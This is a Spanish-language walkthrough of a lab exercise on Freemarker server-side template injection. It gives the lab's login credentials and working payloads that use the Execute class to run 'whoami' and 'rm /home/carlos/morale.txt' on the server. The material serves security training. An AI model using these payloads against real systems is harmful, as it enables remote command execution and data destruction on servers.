# 💉 SSTI usando la documentación del motor (Freemarker)

## 📄 Descripción del laboratorio

La aplicación permite a usuarios con rol **content-manager** editar directamente las plantillas utilizadas para renderizar productos.

El contenido introducido se evalúa directamente como una **plantilla Freemarker**, sin ningún tipo de sanitización, restricciones de seguridad ni sandboxing.

Esto introduce una vulnerabilidad crítica de **Server-Side Template Injection (SSTI)** en un motor Java, con impacto potencial de **ejecución remota de comandos**.

El objetivo es:

* Identificar el **motor de plantillas utilizado**.
* Consultar la **documentación oficial del motor**.
* Ejecutar **código arbitrario en el servidor**.
* Eliminar el archivo:

```
/home/carlos/morale.txt
```

 

## 📚 Teoría

**Freemarker** es un motor de plantillas ampliamente utilizado en aplicaciones Java, especialmente en frameworks como **Spring** o **Struts**.

Permite utilizar:

Expresiones dinámicas:

```java
${ ... }
```

Directivas:

```
<# ... >
```

o

```
[# ... ]
```

El problema aparece cuando una aplicación ejecuta algo como:

```
Template.process(userInput, model);
```

recibiendo **input controlado por el usuario sin escape**.

En este escenario, un atacante puede:

* Instanciar **clases Java arbitrarias** mediante `?new()`.
* Acceder a **utilidades peligrosas del sistema**.
* Ejecutar **comandos del sistema operativo**.

Un vector documentado en Freemarker utiliza la clase:

```
freemarker.template.utility.Execute
```

Esta clase permite ejecutar comandos del sistema directamente desde la plantilla, lo que convierte una vulnerabilidad **SSTI en ejecución remota de comandos (RCE)**.

La documentación oficial de Freemarker describe los mecanismos que permiten este tipo de explotación.

 

## 📝 Práctica

### 🎯 Objetivo

Eliminar el archivo:

```
/home/carlos/morale.txt
```

explotando una vulnerabilidad **SSTI en Freemarker**.

 

### 1️⃣ Acceso a la funcionalidad vulnerable

Se inicia sesión con las credenciales:

```
content-manager:C0nt3ntM4n4g3r
```

Se accede a la sección de **productos**, donde existe una opción **Edit template** que permite modificar directamente la plantilla utilizada para renderizar el producto.

El contenido introducido:

* Se refleja dinámicamente en la **vista previa o en la página final**.

### 2️⃣ Identificación del motor de plantillas

Se fuerza un **error de sintaxis** en la plantilla para provocar un **stack trace**.

El mensaje de error revela:

```
FreeMarker template error
```

Esto confirma que el motor de plantillas utilizado es **Freemarker**.

<img width="768" height="133" alt="image" src="https://github.com/user-attachments/assets/850a2f1d-0d11-40c2-89c8-13fe58c33344" />

 

### 3️⃣ Uso de la documentación oficial

Se consulta la documentación oficial:

```
https://freemarker.apache.org
```

y referencias como **PayloadsAllTheThings** para SSTI en Freemarker.

Se identifica que Freemarker permite instanciar clases Java utilizando:

```java
"Clase"?new()
```

La clase:

```java
freemarker.template.utility.Execute
```

permite ejecutar comandos del sistema operativo.

 

### 4️⃣ Confirmación de ejecución de comandos

Se prueba el siguiente payload para validar la ejecución de comandos:

```java
${"freemarker.template.utility.Execute"?new()("whoami")}
```

<img width="768" height="219" alt="image" src="https://github.com/user-attachments/assets/14db3fc5-a20c-4dc0-9a1a-9adccb940015" />
<br>
Resultado:

La página muestra el **usuario del sistema**, lo que confirma la ejecución remota de comandos en el servidor.

Esto confirma que:

* Existe **SSTI funcional**.
* Es posible ejecutar **comandos del sistema**.

 

### 5️⃣ Explotación final

Se construye el payload final para eliminar el archivo objetivo:

```java
${"freemarker.template.utility.Execute"?new()("rm /home/carlos/morale.txt")}
```

Se guarda la plantilla modificada o se renderiza la vista.

El comando se ejecuta en el servidor sin necesidad de interacción adicional.

El archivo:

```
/home/carlos/morale.txt
```

es eliminado correctamente mediante **Server-Side Template Injection en Freemarker**.

El laboratorio detecta la acción y se marca como **resuelto**.
